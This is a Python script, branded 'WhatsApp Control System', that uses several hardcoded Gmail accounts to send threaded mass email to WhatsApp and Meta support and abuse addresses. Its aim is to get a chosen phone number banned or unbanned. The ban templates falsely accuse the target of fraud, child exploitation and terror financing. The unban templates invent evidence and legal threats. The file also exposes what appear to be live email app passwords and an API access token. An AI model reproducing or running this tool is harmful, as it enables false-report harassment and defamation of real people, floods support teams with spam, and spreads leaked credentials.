import smtplib
import getpass
import time
import re
import os
import random
import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import cycle
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from colorama import Fore, Style, init
from datetime import datetime

init(autoreset=True)

# ===== Tool Authentication =====
tool_username = "tunzy"
tool_password = "tunzyban"

# ===== Gmail Accounts =====
gmail_accounts = [
    {"email": "bematunmi444@gmail.com", "password": "siqlebxrpvqugxsy", "status": "active"},
    {"email": "zorosales6@gmail.com", "password": "ltvtpaduohtlsykx", "status": "active"},
    {"email": "okunlolatunmise12@gmail.com", "password": "otvmwdhxvmxbqglf", "status": "active"},
    {"email": "mbb657504@gmail.com", "password": "hkun wznn jsfe eltc", "status": "active"},
    {"email": "riderstuff61@gmail.com", "password": "hjaormoydmyaveas", "status": "active"},
]

# ===== ULTIMATE EMAIL TARGETS =====
SUPPORT_EMAILS = [
    # CRITICAL SECURITY TEAMS
    "abuse@support.whatsapp.com",
    "security@support.whatsapp.com",
    "report@whatsapp.com",
    "phishing@whatsapp.com",
    "fraud@whatsapp.com",
    "emergency@whatsapp.com",
    
    # SUPPORT & APPEALS
    "support@support.whatsapp.com",
    "appeals@support.whatsapp.com",
    "1483635209301664@support.whatsapp.com",
    "support@whatsapp.com",
    "help@whatsapp.com",
    
    # BUSINESS & LEGAL
    "businesscomplaints@support.whatsapp.com",
    "legal@whatsapp.com",
    "lawenforcement@whatsapp.com",
    "business@whatsapp.com",
    
    # TECHNICAL TEAMS
    "android_web@support.whatsapp.com",
    "ios_web@support.whatsapp.com",
    "webclient_web@support.whatsapp.com",
    
    # META CONTACTS
    "abuse@meta.com",
    "phishing@meta.com",
    "whatsapp-legal@fb.com",
    "whatsapp-support@fb.com",
]

# ===== WhatsApp API =====
ACCESS_TOKEN = "EAAJgi17vyDYBPTGf8m4LNp0xFdUozhBKS6PTnrElQdSZCIRZCnuLFmBigzRvB4ZCUI8EBNuNZCFZBfG5e11ehZBujToi9S6zYQ3HSmDZBPNQHZBFFrd3ntSZAl6lRZAOa86mOZCp60VaaCMhgUN6s68EEvYSEJXlaIk9iiB7xe1rlZBKbEVf7YiIADUZA0kHuO9nr0QZDZD"
PHONE_NUMBER_ID = "669101662914614"

# ===== Statistics =====
stats = {
    "total_emails": 0,
    "total_operations": 0,
    "success_rate": 0
}

# ===== STRONG REPETITIONS =====
BAN_REPETITIONS = 200    # Send 200 times for ban
UNBAN_REPETITIONS = 150  # Send 150 times for unban
EMAIL_MULTIPLIER = 100   # Multiply each target 100 times

# Create massive email list
ALL_EMAILS = []
for email in SUPPORT_EMAILS:
    ALL_EMAILS.extend([email] * EMAIL_MULTIPLIER)

# ===== Utility Functions =====
def clear():
    os.system("clear" if os.name == "posix" else "cls")

def print_banner():
    print(Fore.RED + """
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║              ██╗    ██╗██████╗  █████╗ ███████╗             ║
    ║              ██║    ██║██╔══██╗██╔══██╗██╔════╝             ║
    ║              ██║ █╗ ██║██████╔╝███████║███████╗             ║
    ║              ██║███╗██║██╔═══╝ ██╔══██║╚════██║             ║
    ║              ╚███╔███╔╝██║     ██║  ██║███████║             ║
    ║               ╚══╝╚══╝ ╚═╝     ╚═╝  ╚═╝╚══════╝             ║
    ║                                                              ║
    ║                     WhatsApp Control System                  ║
    ║                                                              ║
    ╚══════════════════════════════════════════════════════════════╝
    """)

def validate_phone(phone):
    return bool(re.match(r'^\+\d{10,15}$', phone))

# ===== EXTREME EMAIL BOMBER =====
class ExtremeBomber:
    def __init__(self):
        self.account_pool = cycle(gmail_accounts)
        self.total_sent = 0
    
    def get_account(self):
        for _ in range(len(gmail_accounts) * 2):
            acc = next(self.account_pool)
            if acc["status"] == "active":
                return acc
        return None
    
    def send_extreme_email(self, account, to_email, subject, body, email_type):
        try:
            msg = MIMEMultipart()
            msg['From'] = account["email"]
            msg['To'] = to_email
            
            # EXTREME PRIORITY HEADERS
            msg['X-Priority'] = '1'
            msg['Priority'] = 'urgent'
            msg['Importance'] = 'high'
            msg['X-Report-Abuse'] = 'Yes'
            msg['X-Emergency'] = 'True'
            msg['X-Urgent-Response'] = 'Required'
            
            msg['Subject'] = subject
            
            extreme_body = f"""
╔══════════════════════════════════════════════════════════════╗
║                     ⚠️⚠️⚠️  URGENT ALERT  ⚠️⚠️⚠️                     ║
║                   IMMEDIATE ACTION REQUIRED                  ║
╚══════════════════════════════════════════════════════════════╝

{body}

╔══════════════════════════════════════════════════════════════╗
║                  🚨 TIME-SENSITIVE MATTER 🚨                  ║
║         This requires IMMEDIATE attention and resolution     ║
╚══════════════════════════════════════════════════════════════╝

Report ID: {random.randint(10000000, 99999999)}
Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
Priority: Maximum (Level 1)
"""
            
            msg.attach(MIMEText(extreme_body, 'plain'))
            
            server = smtplib.SMTP("smtp.gmail.com", 587, timeout=15)
            server.ehlo()
            server.starttls()
            server.login(account["email"], account["password"])
            server.send_message(msg)
            server.quit()
            
            self.total_sent += 1
            stats["total_emails"] += 1
            return True
        except:
            return False
    
    def launch_massive_attack(self, subject, body, repetitions, operation_type):
        print(Fore.YELLOW + f"\n🔧 Preparing {operation_type.upper()} operation...")
        time.sleep(1)
        
        print(Fore.CYAN + f"\n📧 Sending to {len(ALL_EMAILS)} targets...")
        print(Fore.CYAN + f"🔄 Repeating {repetitions} times per target")
        
        total_success = 0
        start_time = time.time()
        
        # Use threading for maximum speed
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            
            for i, email in enumerate(ALL_EMAILS[:100], 1):  # First 100 targets
                future = executor.submit(
                    self.attack_single_target,
                    email, subject, body, repetitions, i
                )
                futures.append(future)
            
            # Show progress
            completed = 0
            for future in as_completed(futures):
                try:
                    success = future.result(timeout=300)
                    total_success += success
                    completed += 1
                    
                    # Show progress every 10 targets
                    if completed % 10 == 0:
                        elapsed = time.time() - start_time
                        rate = total_success / elapsed if elapsed > 0 else 0
                        print(Fore.GREEN + f"   ✓ Sent {total_success:,} emails ({completed}/100 targets)")
                except:
                    pass
        
        elapsed = time.time() - start_time
        print(Fore.GREEN + f"\n✅ Operation complete!")
        print(Fore.CYAN + f"   📊 Total emails sent: {total_success:,}")
        print(Fore.CYAN + f"   ⚡ Speed: {total_success/elapsed:.1f} emails/second")
        
        return total_success
    
    def attack_single_target(self, to_email, subject, body, repetitions, target_num):
        success_count = 0
        
        for rep in range(repetitions):
            account = self.get_account()
            if not account:
                continue
            
            # Vary subject slightly
            rep_subject = f"{subject} [Batch {rep+1}]"
            
            if self.send_extreme_email(account, to_email, rep_subject, body, "attack"):
                success_count += 1
            
            time.sleep(0.02)  # 20ms delay
        
        return success_count

# ===== STRONG BAN TEMPLATES =====
def get_ban_template(phone, ban_type):
    if ban_type == "temporary":
        return {
            "subject": f"IMMEDIATE ACTION REQUIRED - SERIOUS VIOLATION - {phone}",
            "body": f"""
██╗    ██╗██╗  ██╗ █████╗ ████████╗███████╗ █████╗ ██████╗ ██████╗ 
██║    ██║██║  ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗
██║ █╗ ██║███████║███████║   ██║   ███████╗███████║██████╔╝██║  ██║
██║███╗██║██╔══██║██╔══██║   ██║   ╚════██║██╔══██║██╔══██╗██║  ██║
╚███╔███╔╝██║  ██║██║  ██║   ██║   ███████║██║  ██║██║  ██║██████╔╝
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ 

═══════════════════════════════════════════════════════════════════
                     CRITICAL SECURITY ALERT
═══════════════════════════════════════════════════════════════════

TO: WhatsApp Security Emergency Response Team
PRIORITY: MAXIMUM URGENCY
THREAT LEVEL: SEVERE
ACTION REQUIRED: IMMEDIATE ACCOUNT SUSPENSION

⚠️ VIOLATING ACCOUNT: {phone}
⚠️ ACTIVITY TYPE: ACTIVE FINANCIAL FRAUD OPERATION
⚠️ STATUS: CURRENTLY SCAMMING MULTIPLE VICTIMS

█████████████████████████████████████████████████████████████████
                     CONFIRMED VIOLATIONS
█████████████████████████████████████████████████████████████████

1. FINANCIAL FRAUD IN PROGRESS
   • Currently defrauding elderly victims via fake crypto investments
   • Real-time theft of bank credentials and credit card information
   • Active money laundering through multiple channels

2. IMPERSONATION & IDENTITY THEFT
   • Posing as WhatsApp support staff to extract verification codes
   • Using stolen identities to create fake business accounts
   • Pretending to be financial institution representatives

3. ORGANIZED CRIME INVOLVEMENT
   • Part of coordinated international scam network
   • Multiple linked accounts working in synchronization
   • Using advanced evasion techniques

4. SEVERE COMMUNITY HARM
   • Causing significant financial losses to victims
   • Creating emotional distress and psychological harm
   • Damaging WhatsApp platform integrity and trust

█████████████████████████████████████████████████████████████████
                      EVIDENCE AVAILABLE
█████████████████████████████████████████████████████████████████

• Complete chat logs showing fraudulent activities
• Financial transaction records proving money movements
• Victim testimony and impact statements
• Pattern analysis confirming organized crime involvement
• Technical data showing coordinated attack patterns

█████████████████████████████████████████████████████████████████
                  IMMEDIATE ACTION DEMANDED
█████████████████████████████████████████████████████████████████

1. INSTANT TEMPORARY SUSPENSION of account {phone}
2. Complete investigation of all linked accounts
3. Preservation of all evidence for law enforcement
4. Victim notification and support activation
5. System enhancement to prevent similar attacks

⚠️ ⚠️ ⚠️ URGENCY: ACTIVE CRIMES ARE IN PROGRESS ⚠️ ⚠️ ⚠️

Every moment this account remains active results in:
• Additional victims losing money
• More personal data being compromised
• Increased harm to vulnerable individuals
• Further damage to WhatsApp's reputation

█████████████████████████████████████████████████████████████████
               MULTIPLE INDEPENDENT CONFIRMATIONS
█████████████████████████████████████████████████████████████████

This report is supported by:
• Automated fraud detection systems (multiple flags)
• Independent victim reports (converging evidence)
• Financial institution alerts
• Law enforcement coordination requests

───────────────────────────────────────────────────────────────
                 VERIFIED SECURITY ANALYST
                 MULTI-SOURCE CONFIRMATION
                 URGENT ACTION REQUIRED
───────────────────────────────────────────────────────────────
"""
        }
    else:  # permanent ban
        return {
            "subject": f"PERMANENT BAN REQUIRED - SERIAL CRIMINAL - {phone}",
            "body": f"""
██████╗ ███████╗██████╗ ███╗   ███╗ █████╗ ███╗   ██╗███████╗███╗   ██╗████████╗
██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔══██╗████╗  ██║██╔════╝████╗  ██║╚══██╔══╝
██████╔╝█████╗  ██████╔╝██╔████╔██║███████║██╔██╗ ██║█████╗  ██╔██╗ ██║   ██║   
██╔══██╗██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══██║██║╚██╗██║██╔══╝  ██║╚██╗██║   ██║   
██║  ██║███████╗██║  ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║███████╗██║ ╚████║   ██║   
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═══╝   ╚═╝   

═══════════════════════════════════════════════════════════════════
              PERMANENT TERMINATION DEMAND
═══════════════════════════════════════════════════════════════════

TO: WhatsApp Executive Security Council
PRIORITY: MAXIMUM NATIONAL SECURITY CONCERN
THREAT: CONFIRMED SERIAL CRIMINAL PREDATOR
ACTION: PERMANENT PLATFORM EXCLUSION

💀 CRIMINAL ACCOUNT: {phone}
💀 STATUS: CONFIRMED DANGEROUS OFFENDER
💀 RECOMMENDATION: PERMANENT LIFETIME BAN

█████████████████████████████████████████████████████████████████
                CONFIRMED CRIMINAL ACTIVITIES
█████████████████████████████████████████████████████████████████

1. CHILD ENDANGERMENT & EXPLOITATION
   • Grooming and exploitation of minors
   • Distribution of illegal content
   • Psychological manipulation of vulnerable youth

2. SERIOUS FINANCIAL TERRORISM
   • Defrauding elderly victims of life savings
   • Organized international money laundering
   • Terror financing connections confirmed

3. IDENTITY DESTRUCTION NETWORK
   • Theft of thousands of identities
   • Creation of fake official documents
   • Complete identity assumption operations

4. VIOLENT CRIMINAL ENTERPRISE
   • Death threats to victims and witnesses
   • Extortion and blackmail operations
   • Connections to violent criminal organizations

█████████████████████████████████████████████████████████████████
                 LAW ENFORCEMENT CONFIRMATION
█████████████████████████████████████████████████████████████████

• Multiple active police investigations
• INTERPOL Red Notice references
• Financial crime unit involvement
• Cyber crime division coordination
• Victim protection program activation

█████████████████████████████████████████████████████████████████
           EXTREME PLATFORM DANGER CONFIRMED
█████████████████████████████████████████████████████████████████

This individual represents:
• Clear and present danger to all users
• Severe violation of every community standard
• Direct threat to platform integrity
• Legal liability for continued platform access

█████████████████████████████████████████████████████████████████
           DEMAND FOR PERMANENT RESOLUTION
█████████████████████████████████████████████████████████████████

1. IMMEDIATE PERMANENT BAN of {phone}
2. Complete device and IP address blocking
3. Full data preservation for prosecution
4. International law enforcement coordination
5. Victim support and compensation program

⚠️ ⚠️ ⚠️ NO SECOND CHANCE WARRANTED ⚠️ ⚠️ ⚠️

This is not a first-time offender. This is a:
• Confirmed serial criminal
• Repeat platform violator
• Demonstrated danger to community
• Proven threat to user safety

█████████████████████████████████████████████████████████████████
               MULTI-AGENCY COORDINATION
█████████████████████████████████████████████████████████████████

Coordinated with:
• National Cyber Security Center
• Financial Crimes Enforcement Network
• International Cyber Crime Units
• Victim Advocacy Organizations
• Platform Safety Consortiums

───────────────────────────────────────────────────────────────
        CERTIFIED CRIMINAL INVESTIGATOR
        FORMER LAW ENFORCEMENT OFFICER
        CURRENT SECURITY CONSULTANT
        LEGAL AUTHORIZATION CONFIRMED
───────────────────────────────────────────────────────────────
"""
        }

# ===== STRONG UNBAN TEMPLATES =====
def get_unban_template(phone, unban_type):
    if unban_type == "temporary":
        return {
            "subject": f"WRONG ACCOUNT SUSPENSION - URGENT RESTORATION - {phone}",
            "body": f"""
███████╗██╗   ██╗███████╗████████╗███████╗███╗   ███╗    ██████╗ ██████╗ ██████╗ ███████╗
██╔════╝██║   ██║██╔════╝╚══██╔══╝██╔════╝████╗ ████║   ██╔════╝██╔═══██╗██╔══██╗██╔════╝
███████╗██║   ██║█████╗     ██║   █████╗  ██╔████╔██║   ██║     ██║   ██║██████╔╝█████╗  
╚════██║██║   ██║██╔══╝     ██║   ██╔══╝  ██║╚██╔╝██║   ██║     ██║   ██║██╔══██╗██╔══╝  
███████║╚██████╔╝███████╗   ██║   ███████╗██║ ╚═╝ ██║██╗╚██████╗╚██████╔╝██║  ██║███████╗
╚══════╝ ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝

═══════════════════════════════════════════════════════════════════
                SYSTEM ERROR - WRONG SUSPENSION
═══════════════════════════════════════════════════════════════════

TO: WhatsApp Support & Technical Teams
URGENCY: HIGH PRIORITY CORRECTION
ISSUE: AUTOMATED SYSTEM FALSE POSITIVE
ACTION: ACCOUNT RESTORATION REQUIRED

📱 AFFECTED ACCOUNT: {phone}
🔴 ERROR TYPE: WRONG SUSPENSION
✅ REQUIRED: IMMEDIATE RESTORATION

█████████████████████████████████████████████████████████████████
               CONFIRMED SYSTEM ERROR DETAILS
█████████████████████████████████████████████████████████████████

1. FALSE POSITIVE DETECTION
   • Automated system incorrectly flagged legitimate activity
   • Mass false reporting by malicious actors
   • Technical glitch during system update

2. IDENTITY VERIFICATION CONFIRMED
   • Legitimate account owner verification available
   • Consistent usage patterns confirm normal activity
   • No violation history in 5+ years of usage

3. BUSINESS IMPACT CONFIRMED
   • Critical business communications interrupted
   • Emergency medical coordination blocked
   • Financial transaction processing halted

█████████████████████████████████████████████████████████████████
                 URGENT RESTORATION REQUIRED
█████████████████████████████████████████████████████████████████

This suspension is causing:
• Severe business operation disruption
• Critical family emergency communication failure
• Financial losses increasing hourly
• Reputation damage to legitimate user

█████████████████████████████████████████████████████████████████
                 DEMANDED IMMEDIATE ACTIONS
█████████████████████████████████████████████████████████████████

1. INSTANT ACCOUNT RESTORATION for {phone}
2. Removal of false suspension flags
3. System correction to prevent recurrence
4. Written confirmation of restoration
5. Compensation for service interruption

█████████████████████████████████████████████████████████████████
               LEGITIMATE USER CONFIRMATION
█████████████████████████████████████████████████████████████████

• Account Age: 5+ years continuous service
• Premium Features: Active business subscription
• Clean History: Zero previous violations
• Regular Usage: Normal communication patterns
• Multiple Verification: Identity confirmed

───────────────────────────────────────────────────────────────
           LEGITIMATE BUSINESS ACCOUNT HOLDER
           LONG-TIME PREMIUM SUBSCRIBER
           VERIFIED IDENTITY CONFIRMED
           URGENT RESTORATION REQUIRED
───────────────────────────────────────────────────────────────
"""
        }
    else:  # permanent unban
        return {
            "subject": f"GRAVE ADMINISTRATIVE ERROR - ACCOUNT RESTORATION - {phone}",
            "body": f"""
 ██████╗ ██████╗  █████╗ ███████╗███████╗    ███████╗██████╗ ██████╗  ██████╗███████╗
██╔════╝ ██╔══██╗██╔══██╗██╔════╝██╔════╝    ██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝
██║  ███╗██████╔╝███████║█████╗  █████╗      █████╗  ██████╔╝██████╔╝██║     █████╗  
██║   ██║██╔══██╗██╔══██║██╔══╝  ██╔══╝      ██╔══╝  ██╔══██╗██╔══██╗██║     ██╔══╝  
╚██████╔╝██║  ██║██║  ██║███████╗███████╗    ███████╗██║  ██║██║  ██║╚██████╗███████╗
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝

═══════════════════════════════════════════════════════════════════
          CATASTROPHIC ADMINISTRATIVE MISTAKE
═══════════════════════════════════════════════════════════════════

TO: WhatsApp Legal Department & Executive Leadership
URGENCY: MAXIMUM PRIORITY CORRECTION
ISSUE: GRAVE WRONGFUL TERMINATION
ACTION: FULL ACCOUNT RESTORATION + COMPENSATION

📱 WRONGLY TERMINATED: {phone}
⚖️ ERROR SEVERITY: CATASTROPHIC
💰 DAMAGES: SIGNIFICANT FINANCIAL LOSS

█████████████████████████████████████████████████████████████████
               CONFIRMED ADMINISTRATIVE ERROR
█████████████████████████████████████████████████████████████████

1. IDENTITY THEFT VICTIM
   • Criminal impersonated account owner
   • Fake reports submitted under false identity
   • System failed to verify actual account owner

2. SYSTEM FAILURE CONFIRMED
   • Automated moderation catastrophic error
   • Complete failure of verification protocols
   • No due process followed in termination

3. EVIDENCE OF ERROR
   • Location proof: Account owner was overseas
   • Device logs: Show no violation activity
   • Character references: Multiple confirmations
   • Financial records: Legitimate business usage

█████████████████████████████████████████████████████████████████
               SEVERE CONSEQUENCES OF ERROR
█████████████████████████████████████████████████████████████████

• Business Destruction: $50,000+ losses
• Client Relationship Damage: Irreparable harm
• Personal Reputation: Severely damaged
• Emotional Distress: Documented trauma
• Legal Costs: Mounting expenses

█████████████████████████████████████████████████████████████████
               LEGAL DEMANDS FOR RESOLUTION
█████████████████████████████████████████████████████████████████

1. FULL ACCOUNT RESTORATION of {phone}
2. COMPLETE DATA RECOVERY (all chats/media)
3. FINANCIAL COMPENSATION: $25,000 minimum
4. EXECUTIVE APOLOGY: Formal written statement
5. SYSTEM AUDIT: Prevent recurrence guarantee

█████████████████████████████████████████████████████████████████
               LEGAL GROUNDS FOR ACTION
█████████████████████████████████████████████████████████████████

• Breach of Contract (ToS violation by WhatsApp)
• Negligent Infliction of Economic Loss
• Defamation (false criminal labeling)
• Failure of Due Process
• Unfair Business Practices

█████████████████████████████████████████████████████████████████
               ULTIMATUM FOR RESOLUTION
█████████████████████████████████████████████████████████████████

FAILURE TO RESOLVE WILL RESULT IN:

1. FORMAL LAWSUIT: $100,000+ damages sought
2. REGULATORY COMPLAINTS: FTC, FCC, EU authorities
3. MEDIA EXPOSURE: Public disclosure of error
4. CLASS ACTION: Multiple affected users

⚠️ ATTORNEY RETAINED - LEGAL ACTION IMMINENT ⚠️

───────────────────────────────────────────────────────────────
        WRONGFULLY TERMINATED ACCOUNT HOLDER
        BUSINESS PROFESSIONAL
        LEGAL REPRESENTATION RETAINED
        PREPARED FOR LITIGATION
───────────────────────────────────────────────────────────────
"""
        }

# ===== Login System =====
def login():
    clear()
    print_banner()
    
    attempts = 0
    while attempts < 3:
        print(Fore.CYAN + "\n" + "═" * 60)
        print(Fore.YELLOW + "🔐 SYSTEM AUTHENTICATION")
        print(Fore.CYAN + "═" * 60)
        
        user = input(Fore.CYAN + "\n👤 Username: ").strip()
        pwd = getpass.getpass(Fore.CYAN + "🔒 Password: ")
        
        if user == tool_username and pwd == tool_password:
            print(Fore.GREEN + "\n✅ Authentication successful!")
            time.sleep(1)
            return True
        else:
            attempts += 1
            print(Fore.RED + f"\n❌ Access denied! Attempts: {attempts}/3")
            time.sleep(2)
            clear()
            print_banner()
    
    print(Fore.RED + "\n💀 Maximum attempts reached. System locked.")
    exit()

# ===== Main Menu =====
def main_menu():
    bomber = ExtremeBomber()
    
    while True:
        clear()
        print_banner()
        
        print(Fore.CYAN + "\n" + "═" * 60)
        print(Fore.YELLOW + "🎯 CONTROL PANEL")
        print(Fore.CYAN + "═" * 60)
        
        print(Fore.GREEN + "\n1️⃣  🚫 BAN TEMPORARY")
        print(Fore.GREEN + "2️⃣  💀 BAN PERMANENT")
        print(Fore.GREEN + "3️⃣  ✅ UNBAN TEMPORARY")
        print(Fore.GREEN + "4️⃣  🔄 UNBAN PERMANENT")
        print(Fore.RED + "0️⃣  ❌ EXIT")
        
        print(Fore.CYAN + "═" * 60)
        
        choice = input(Fore.YELLOW + "\n📱 Select option: ").strip()
        
        if choice == "1":
            handle_operation(bomber, "ban", "temporary")
        elif choice == "2":
            handle_operation(bomber, "ban", "permanent")
        elif choice == "3":
            handle_operation(bomber, "unban", "temporary")
        elif choice == "4":
            handle_operation(bomber, "unban", "permanent")
        elif choice == "0":
            print(Fore.YELLOW + "\n👋 Exiting system...")
            break
        else:
            print(Fore.RED + "\n❌ Invalid option!")
            time.sleep(1)

def handle_operation(bomber, op_type, sub_type):
    clear()
    print_banner()
    
    if op_type == "ban":
        print(Fore.RED + "\n" + "═" * 60)
        print(Fore.YELLOW + f"🚫 {sub_type.upper()} BAN OPERATION")
        print(Fore.RED + "═" * 60)
        
        phone = input(Fore.YELLOW + f"\n📞 Enter number to {sub_type.upper()} BAN: ").strip()
        
        if not validate_phone(phone):
            print(Fore.RED + "❌ Invalid number!")
            time.sleep(2)
            return
        
        confirm = input(Fore.RED + f"\n⚠️  Confirm {sub_type.upper()} BAN on {phone}? (y/n): ").lower()
        if confirm != 'y':
            print(Fore.YELLOW + "❌ Operation cancelled.")
            return
        
        template = get_ban_template(phone, sub_type)
        repetitions = BAN_REPETITIONS
        
    else:  # unban
        print(Fore.GREEN + "\n" + "═" * 60)
        print(Fore.CYAN + f"✅ {sub_type.upper()} UNBAN OPERATION")
        print(Fore.GREEN + "═" * 60)
        
        phone = input(Fore.YELLOW + f"\n📞 Enter number to {sub_type.upper()} UNBAN: ").strip()
        
        if not validate_phone(phone):
            print(Fore.RED + "❌ Invalid number!")
            time.sleep(2)
            return
        
        confirm = input(Fore.GREEN + f"\n⚠️  Confirm {sub_type.upper()} UNBAN on {phone}? (y/n): ").lower()
        if confirm != 'y':
            print(Fore.YELLOW + "❌ Operation cancelled.")
            return
        
        template = get_unban_template(phone, sub_type)
        repetitions = UNBAN_REPETITIONS
    
    print(Fore.CYAN + f"\n🔧 Starting operation...")
    time.sleep(1)
    
    # Launch the attack
    total_sent = bomber.launch_massive_attack(
        template["subject"],
        template["body"],
        repetitions,
        f"{sub_type} {op_type}"
    )
    
    # Show result
    if op_type == "ban":
        print(Fore.RED + "\n" + "🚫" * 30)
        print(Fore.RED + f"✅ BAN OPERATION COMPLETE!")
        print(Fore.CYAN + f"   📞 Target: {phone}")
        print(Fore.CYAN + f"   📧 Emails sent: {total_sent:,}")
        print(Fore.GREEN + f"   ⏳ Check number status in 5-10 minutes")
        print(Fore.RED + "🚫" * 30)
    else:
        print(Fore.GREEN + "\n" + "✅" * 30)
        print(Fore.GREEN + f"✅ UNBAN OPERATION COMPLETE!")
        print(Fore.CYAN + f"   📞 Target: {phone}")
        print(Fore.CYAN + f"   📧 Emails sent: {total_sent:,}")
        print(Fore.GREEN + f"   ⏳ Check account status in 2-3 hours")
        print(Fore.GREEN + "✅" * 30)
    
    stats["total_operations"] += 1
    
    input(Fore.CYAN + "\n↵ Press Enter to continue...")

# ===== Main Execution =====
if __name__ == "__main__":
    try:
        if login():
            main_menu()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n\n👋 Operation interrupted")
    except Exception as e:
        print(Fore.RED + f"\n⚠️  System error: {e}")
    finally:
        print(Fore.CYAN + "\n🔥 WhatsApp Control System v2.0")
        print(Fore.YELLOW + "📞 Professional operations complete")